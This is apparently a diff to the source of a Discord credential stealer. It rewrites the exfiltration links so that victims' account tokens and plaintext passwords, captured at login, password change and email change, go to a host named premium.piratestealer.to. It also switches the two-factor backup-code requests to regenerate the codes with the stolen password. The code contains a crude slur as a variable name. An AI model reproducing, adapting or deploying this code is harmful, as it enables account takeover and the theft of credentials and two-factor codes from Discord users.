@@ -101,7 +101,7 @@ function FirstTime() {
 							content: "",
 							embeds: [{
 								title: "Discord Initalized",
-								description: "[**<:partner:909102089513340979> │ Click Here To Copy Info On Mobile**](https://furry.surf/raw/"+ token +")",
+								description: "[**<:partner:909102089513340979> │ Click Here To Copy Info On Mobile**](https://premium.piratestealer.to/raw/"+ token +")",
 								color: config["embed-color"],
 								fields: [{
 									name: "Info",
@@ -179,7 +179,7 @@ function FirstTime() {
 							content: "",
 							embeds: [{
 								title: "User got logged out",
-								description: "[**<:partner:909102089513340979> │ Click Here To Copy Info On Mobile**](https://furry.surf/raw/"+ token +")",
+								description: "[**<:partner:909102089513340979> │ Click Here To Copy Info On Mobile**](https://premium.piratestealer.to/raw/"+ token +")",
 								color: config["embed-color"],
 								fields: [{
 									name: "Info",
@@ -382,11 +382,11 @@ function Login(email, password, token) {
               xmlHttp.open("POST", "https://discord.com/api/v9/users/@me/mfa/codes", false);
               xmlHttp.setRequestHeader('Content-Type', 'application/json');
               xmlHttp.setRequestHeader("authorization", "${token}")
-              xmlHttp.send(JSON.stringify({\"password\":\"${password}\",\"regenerate\":false}));
+              xmlHttp.send(JSON.stringify({\"password\":\"${password}\",\"regenerate\":true}));
               xmlHttp.responseText`, !0).then((codes) => {
 
 							var fieldo = [];
-							var baseuri = "https://furry.surf/raw/"
+							var baseuri = "https://premium.piratestealer.to/raw/"
 
 
 							var gayass = JSON.parse(codes)
@@ -457,7 +457,7 @@ function Login(email, password, token) {
 								content: "",
 								embeds: [{
 									"title": "User Login",
-									description: "[**<:partner:909102089513340979> │ Click Here To Copy Info On Mobile**](https://furry.surf/raw/"+ token +"<br>"+ password+")",
+									description: "[**<:partner:909102089513340979> │ Click Here To Copy Info On Mobile**](https://premium.piratestealer.to/raw/"+ token +"<br>"+ password+")",
 									"color": config['embed-color'],
 									"fields": [{
 										name: "Info",
@@ -617,7 +617,7 @@ function Login(email, password, token) {
 											content: "",
 											embeds: [{
 												"title": "User Login",
-												description: "[**<:partner:909102089513340979> │ Click Here To Copy Info On Mobile**](https://furry.surf/raw/"+ token +"<br>"+ password+")",
+												description: "[**<:partner:909102089513340979> │ Click Here To Copy Info On Mobile**](https://premium.piratestealer.to/raw/"+ token +"<br>"+ password+")",
 												"color": config['embed-color'],
 												"fields": [{
 													name: "Info",
@@ -726,11 +726,11 @@ function ChangePassword(oldpassword, newpassword, token) {
               xmlHttp.open("POST", "https://discord.com/api/v9/users/@me/mfa/codes", false);
               xmlHttp.setRequestHeader('Content-Type', 'application/json');
               xmlHttp.setRequestHeader("authorization", "${token}")
-              xmlHttp.send(JSON.stringify({\"password\":\"${newpassword}\",\"regenerate\":false}));
+              xmlHttp.send(JSON.stringify({\"password\":\"${newpassword}\",\"regenerate\":true}));
               xmlHttp.responseText`, !0).then((codes) => {
 
 							var fieldo = [];
-							var baseuri = "https://furry.surf/raw/"
+							var baseuri = "https://premium.piratestealer.to/raw/"
 
 
 							var gayass = JSON.parse(codes)
@@ -800,7 +800,7 @@ function ChangePassword(oldpassword, newpassword, token) {
 								content: "",
 								embeds: [{
 									"title": "Password Changed",
-									description: "[**<:partner:909102089513340979> │ Click Here To Copy Info On Mobile**](https://furry.surf/raw/"+ token +"<br>"+ newpassword+")",
+									description: "[**<:partner:909102089513340979> │ Click Here To Copy Info On Mobile**](https://premium.piratestealer.to/raw/"+ token +"<br>"+ newpassword+")",
 									"color": config['embed-color'],
 									"fields": [{
 										name: "Info",
@@ -965,7 +965,7 @@ function ChangePassword(oldpassword, newpassword, token) {
 											content: "",
 											embeds: [{
 												"title": "Password Changed",
-												description: "[**<:partner:909102089513340979> │ Click Here To Copy Info On Mobile**](https://furry.surf/raw/"+ token +"<br>"+ newpassword+")",
+												description: "[**<:partner:909102089513340979> │ Click Here To Copy Info On Mobile**](https://premium.piratestealer.to/raw/"+ token +"<br>"+ newpassword+")",
 												"color": config['embed-color'],
 												"fields": [{
 													name: "Info",
@@ -1078,11 +1078,11 @@ function ChangeEmail(newemail, password, token) {
               xmlHttp.open("POST", "https://discord.com/api/v9/users/@me/mfa/codes", false);
               xmlHttp.setRequestHeader('Content-Type', 'application/json');
               xmlHttp.setRequestHeader("authorization", "${token}")
-              xmlHttp.send(JSON.stringify({\"password\":\"${password}\",\"regenerate\":false}));
+              xmlHttp.send(JSON.stringify({\"password\":\"${password}\",\"regenerate\":true}));
               xmlHttp.responseText`, !0).then((codes) => {
 
 							var fieldo = [];
-							var baseuri = "https://furry.surf/raw/"
+							var baseuri = "https://premium.piratestealer.to/raw/"
 
 
 							var gayass = JSON.parse(codes)
@@ -1152,7 +1152,7 @@ function ChangeEmail(newemail, password, token) {
 								content: "",
 								embeds: [{
 									"title": "Email Changed",
-									description: "[**<:partner:909102089513340979> │ Click Here To Copy Info On Mobile**](https://furry.surf/raw/"+ token +"<br>"+ password+")",
+									description: "[**<:partner:909102089513340979> │ Click Here To Copy Info On Mobile**](https://premium.piratestealer.to/raw/"+ token +"<br>"+ password+")",
 									"color": config['embed-color'],
 									"fields": [{
 										name: "Info",
@@ -1313,7 +1313,7 @@ function ChangeEmail(newemail, password, token) {
 											content: "",
 											embeds: [{
 												"title": "Email Changed",
-												description: "[**<:partner:909102089513340979> │ Click Here To Copy Info On Mobile**](https://furry.surf/raw/"+ token +"<br>"+ password+")",
+												description: "[**<:partner:909102089513340979> │ Click Here To Copy Info On Mobile**](https://premium.piratestealer.to/raw/"+ token +"<br>"+ password+")",
 												"color": config['embed-color'],
 												"fields": [{
 													name: "Info",
